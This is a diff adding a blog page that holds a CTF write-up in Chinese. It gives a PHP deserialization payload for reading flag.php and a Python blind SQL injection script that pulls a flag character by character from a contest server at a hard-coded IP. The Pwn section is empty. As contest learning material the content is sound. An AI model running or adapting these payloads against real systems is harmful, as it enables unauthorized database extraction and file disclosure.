@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="i春秋答题赛（第二季）Webeasy_php入门的文件包含加反序列化payload 1class=O:4:&amp;quot;hint&amp;quot;:2:&amp;#123;s:4:&amp;quot;file&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;&amp;#125;  easy_sql直接贴脚本 1234567891011121314151617import requestsimport string#">
+<meta property="og:type" content="website">
+<meta property="og:title" content="dkk-blog">
+<meta property="og:url" content="/dkk/ichunqiu.html">
+<meta property="og:site_name" content="dkk-blog">
+<meta property="og:description" content="i春秋答题赛（第二季）Webeasy_php入门的文件包含加反序列化payload 1class=O:4:&amp;quot;hint&amp;quot;:2:&amp;#123;s:4:&amp;quot;file&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;&amp;#125;  easy_sql直接贴脚本 1234567891011121314151617import requestsimport string#">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-10-21T16:22:09.483Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dkk-blog">
+<meta name="twitter:description" content="i春秋答题赛（第二季）Webeasy_php入门的文件包含加反序列化payload 1class=O:4:&amp;quot;hint&amp;quot;:2:&amp;#123;s:4:&amp;quot;file&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;&amp;#125;  easy_sql直接贴脚本 1234567891011121314151617import requestsimport string#">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>dkk-blog</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4">
+        
+          <header id="header">
+  <a href="/">
+  
+    
+      <div id="logo" style="background-image: url(/images/logo.png);"></div>
+    
+  
+    <div id="title">
+      <h1>dkk-blog</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Writing</a></li>
+       
+        <li><a href="/projects_url">Projects</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  
+
+  <div class="content" itemprop="articleBody">
+      
+          <h1 id="i春秋答题赛（第二季）"><a href="#i春秋答题赛（第二季）" class="headerlink" title="i春秋答题赛（第二季）"></a>i春秋答题赛（第二季）</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><p>入门的文件包含加反序列化<br>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class=O:4:&quot;hint&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>直接贴脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#strary = string.digits+string+string.ascii_letters+string.punctuation</span></span><br><span class="line">url = <span class="string">"http://120.55.43.255:13003/?id=1 and (ascii(mid(version()from(1)))&gt;48)"</span></span><br><span class="line">req = requests.Session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            payload = <span class="string">"http://120.55.43.255:13003/?id=1 and (ascii(mid((select flag from flag)from(&#123;&#125;)))&lt;&#123;&#125;)"</span>.format(i,j)</span><br><span class="line">            text = req.get(payload).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"3000"</span> <span class="keyword">in</span> text:</span><br><span class="line">                <span class="comment">#print(j)</span></span><br><span class="line">                flag+=chr(j<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">print</span> (flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">database()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3>
+        
+  </div>
+</article>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 dkk
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
